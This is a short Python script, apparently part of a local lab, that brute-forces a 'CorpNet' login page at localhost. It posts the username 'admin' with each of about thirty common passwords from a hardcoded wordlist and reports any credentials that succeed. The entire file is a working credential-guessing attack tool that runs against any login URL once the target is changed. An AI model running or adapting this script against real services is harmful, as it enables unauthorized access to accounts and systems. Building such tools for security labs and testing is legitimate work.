#!/usr/bin/env python3
"""
Brute-force attack script against the CorpNet target server.

Usage:
    python bruteforce.py [--username admin] [--delay 0.1] [--stop-on-success]
"""

import argparse
import time
import sys
import requests

# ── Wordlist ──────────────────────────────────────────────────────────────────
WORDLIST = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "iloveyou", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman",
    "1qaz2wsx", "7777777", "121212", "000000", "secret123",
]

TARGET_URL = "http://localhost:5001/login"


def bruteforce(username: str, delay: float, stop_on_success: bool) -> None:
    total = len(WORDLIST)
    session = requests.Session()

    print(f"\n[BruteForce] Target  : {TARGET_URL}")
    print(f"[BruteForce] Username: {username}")
    print(f"[BruteForce] Wordlist: {total} passwords")
    print(f"[BruteForce] Delay   : {delay}s between attempts")
    print("-" * 60)

    found = False
    for idx, password in enumerate(WORDLIST, start=1):
        try:
            resp = session.post(
                TARGET_URL,
                data={"username": username, "password": password},
                timeout=5,
            )
            success = resp.status_code == 200 and "Welcome" in resp.text
        except requests.RequestException as exc:
            print(f"[attempt {idx:>2}/{total}] {username}:{password} → ERROR ({exc})")
            time.sleep(delay)
            continue

        status = "SUCCESS" if success else "FAILED "
        print(f"[attempt {idx:>2}/{total}] {username}:{password:<20} → {status}")

        if success:
            print(f"\n[SUCCESS] Found credentials: {username}:{password}")
            found = True
            if stop_on_success:
                break

        time.sleep(delay)

    if not found:
        print("\n[DONE] Password not found in wordlist.")


def main():
    parser = argparse.ArgumentParser(description="BruteForce attack against CorpNet login")
    parser.add_argument("--username", default="admin", help="Target username (default: admin)")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Seconds between attempts (default: 0.1)")
    parser.add_argument("--stop-on-success", action="store_true",
                        help="Stop as soon as the correct password is found")
    args = parser.parse_args()

    try:
        bruteforce(args.username, args.delay, args.stop_on_success)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(0)


if __name__ == "__main__":
    main()
